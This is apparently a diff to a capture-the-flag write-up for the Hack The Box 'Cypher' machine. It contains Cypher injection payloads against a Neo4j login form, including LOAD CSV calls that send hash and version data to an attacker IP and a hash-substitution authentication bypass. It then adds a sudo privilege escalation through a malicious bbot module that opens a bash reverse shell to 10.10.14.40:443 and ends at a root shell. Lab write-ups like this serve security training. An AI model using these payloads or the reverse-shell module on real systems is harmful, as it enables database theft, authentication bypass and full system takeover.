@@ -156,7 +156,6 @@ Connection: keep-alive
 Referer: http://cypher.htb/login
 
 
-
 {"username":"' OR 1=1 LOAD CSV FROM 'http://10.10.14.40:7777/'+h.value AS y RETURN ''////","password":"/**/"}
 
 
@@ -172,7 +171,7 @@ Accept: text/html, image/gif, image/jpeg, */*; q=0.2
 Connection: keep-alive
 
 # 2. ' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.40/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
-message: Invalid URL 'http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community': Illegal character in query at index 45: http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community ()}
+get error message: Invalid URL 'http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community': Illegal character in query at index 45: http://10.10.14.40/?version=5.24.1&name=Neo4j Kernel&edition=community ()}
 
 # 3. provide password
 {"username":"' OR 1=1 return '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' as hash //","password":"password"}
@@ -230,3 +229,58 @@ user.txt
 cat user.txt
 ```
 
+# Root flag
+
+```bash
+graphasm@cypher:~/.ssh$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+
+graphasm@cypher:~/.ssh$ sudo bbot -t /root/root.txt -d
+```
+
+## Shell
+read this: https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto
+
+```python
+from bbot.modules.base import BaseModule
+import os
+
+class ls_module(BaseModule):
+    watched_events = ["DNS_NAME"]  # No events to watch
+    produced_events = ["LS_OUTPUT"]  # The event to produce after running 'ls'
+    flags = ["passive", "safe"]
+    meta = {"description": "Runs 'ls' command and returns the output line by line"}
+    per_domain_only = True
+
+    async def setup(self):
+        # Any setup needed for the module (e.g., checking for permissions)
+        print("abcdedfgtjakfkjsadkfjas==========================================")
+        print(os.system('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.40/443 0>&1"'))
+        return True
+
+    async def handle_event(self, event):
+        self.hugesuccess(f"Got i{event} ================fdsajkfksdajfkjkdsalf====================")
+
+        # Use 'await self.run_process' to run the 'ls' command and capture output
+        ls_result = await self.run_process("ls", "-l")
+
+        # Iterate through each line in the output
+        for line in ls_result.stdout.splitlines():
+            # Do something with each line of the output
+            self.hugeinfo(f"Line from ls: {line.decode()}")
+
+        # Alternatively, you can process the output in real time with 'run_process_live'
+        async for line in self.run_process_live(["grep", "-R", "pattern"]):
+            # Do something with each line of 'grep' output in real time
+            self.hugeinfo(f"Live grep line: {line.decode()}")
+
+
+graphasm@cypher:~/my_modules$ sudo bbot -p /home/graphasm/bbot_preset.yml -m ls_module -t a -d
+
+
+root@cypher:~# cat root.txt
+```
